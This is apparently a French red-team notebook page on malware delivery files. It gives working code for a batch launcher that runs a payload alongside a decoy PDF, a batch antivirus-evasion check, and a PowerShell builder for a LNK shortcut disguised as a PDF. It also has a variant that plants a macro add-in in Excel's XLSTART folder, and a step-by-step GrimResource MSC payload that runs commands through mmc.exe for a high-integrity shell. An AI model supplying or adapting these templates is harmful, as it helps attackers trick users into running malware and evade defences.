
Fichier exécuté par l'utilisateur après extraction du container.

[[#Batch]]
[[#Shell Link]]
[[#Microsoft Saved Console]]

# Batch

formats .bat , .cmd ou .btm.

```batch
::Ceci est un commentaire
@echo off & ::Rendre les commandes invisibles pour l'utilisateur
start payload.exe & ::Execution du payload
start decoy.pdf & ::Execution du Decoy
exit & ::Sortie du batch
```

Bypass d'AV -> [recently discovered](https://x.com/vmray/status/1808903062926315690) -> Permet de faire exécuter le script par cmd au lieu de le faire de manière interactive, le contenu du script n'est alors pas chécké par l'AV.

" When double-clicking on a batch script, `cmdcmdline` will contain a value like `C:\Windows\system32\cmd.exe /c ""C:\Users\Daniel\Desktop\test.bat""`  and `~f0` will contain `C:\Users\Daniel\Desktop\test.bat`.  Conversely, when run from a command prompt that was opened manually, cmdcmdline will just contain `C:\Windows\System32\cmd.exe`."

```
@echo off
echo %cmdcmdline% | find /i "%~f0" || exit
calc
exit
```

---
# Shell Link

Fichier .LNK -> Raccourci.

L'extension .lnk n'est pas montrée même en forçant l'affichage des extensions. On peut le faire pointer vers n'importe quoi.

Script powershell pour créer un LNK.

```powershell
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("trigger.pdf.lnk")
$lnk.TargetPath = "%COMSPEC%"
$lnk.Arguments = "/C start payload.exe && start decoy.pdf"
$lnk.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13"
$lnk.Save()
```

Si le payload est un Add-In Excel, les arguments à passer au raccourci doivent copier le XLAM vers le répertoire XLSTART avant d'exécuter un XLSX.

```powershell
$lnk.Arguments = "/C xcopy /H macros.xlam %APPDATA%\Microsoft\Excel\XLSTART\ && attrib -H %APPDATA%\Microsoft\Excel\XLSTART\macros.xlam && start sales.xlsx"
$lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
$lnk.Save()
```

---
# Microsoft Saved Console

Les fichiers msc sont vulnérable à une XSS et permettent l'exécution de code javascript via la mmc.exe .

Exemple de MSC
https://gist.githubusercontent.com/joe-desimone/2b0bbee382c9bdfcac53f2349a379fa4/raw/961d997c169e4315c2eb0cc6a1af795dd685c550/grimresource.msc


1. Créer le payload suivant qui run cmd.exe

```vbscript
<?xml version='1.0'?>
<stylesheet
    xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
    xmlns:user="placeholder"
    version="1.0">
    <output method="text"/>
    <ms:script implements-prefix="user" language="VBScript">
    <![CDATA[
        Set wshshell = CreateObject("WScript.Shell")
        wshshell.run "C:\\Windows\\System32\\cmd.exe"
]]></ms:script>
</stylesheet>
```

2. L'encoder en URL avec Cyberchef
https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)&input=PD94bWwgdmVyc2lvbj0nMS4wJz8%2BDQo8c3R5bGVzaGVldA0KICAgIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L1hTTC9UcmFuc2Zvcm0iIHhtbG5zOm1zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOnhzbHQiDQogICAgeG1sbnM6dXNlcj0icGxhY2Vob2xkZXIiDQogICAgdmVyc2lvbj0iMS4wIj4NCiAgICA8b3V0cHV0IG1ldGhvZD0idGV4dCIvPg0KICAgIDxtczpzY3JpcHQgaW1wbGVtZW50cy1wcmVmaXg9InVzZXIiIGxhbmd1YWdlPSJWQlNjcmlwdCI%2BDQogICAgPCFbQ0RBVEFbDQogICAgICAgIFNldCB3c2hzaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQogICAgICAgIHdzaHNoZWxsLnJ1biAiQzpcXFdpbmRvd3NcXFN5c3RlbTMyXFxjbWQuZXhlIg0KXV0%2BPC9tczpzY3JpcHQ%2BDQo8L3N0eWxlc2hlZXQ%2B&ieol=CRLF&oeol=CRLF

3. Placer le payload encodé à la ligne 105 de https://gist.githubusercontent.com/joe-desimone/2b0bbee382c9bdfcac53f2349a379fa4/raw/961d997c169e4315c2eb0cc6a1af795dd685c550/grimresource.msc

```
xsl.loadXML(unescape("<ENCODED SCRIPT HERE>"))
```

4. Double cliquer sur le MSC lancera un processus mmc.exe qui a son tour lancera cmd.exe, l'avantage est que MMC est uj binaire qui s'exécute avec l'auto-elevation et peut nous donner un shell à haute intégrité.

Tool automatisé -> https://github.com/ZERODETECTION/MSC_Dropper